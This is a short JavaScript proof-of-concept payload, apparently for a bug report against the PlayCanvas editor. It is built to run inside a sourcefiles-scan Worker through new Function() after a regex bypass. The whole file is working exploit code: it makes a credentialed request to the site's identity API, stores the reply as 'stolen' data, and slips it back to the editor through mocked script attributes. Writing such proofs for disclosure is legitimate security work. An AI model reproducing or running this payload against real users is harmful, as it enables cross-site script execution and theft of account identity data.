// LEAD-01 PoC payload - executes inside sourcefiles-scan Worker at playcanvas.com origin
// This file is fetched by the Worker via XHR and executed via new Function()

// Worker has same-origin access to playcanvas.com API
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://playcanvas.com/api/id', false);
xhr.withCredentials = true;
xhr.send();

var stolen = {};
try { stolen = JSON.parse(xhr.responseText); } catch(e) { stolen = {error: xhr.status}; }

// Signal proof via pc.script mock (Worker returns this to the Editor)
self.pc.script.name = 'XSS_PROOF_LEAD01_REGEX_BYPASS';
self.pc.script.attributes = [{
  name: 'stolen_identity',
  type: 'json',
  defaultValue: stolen
}];
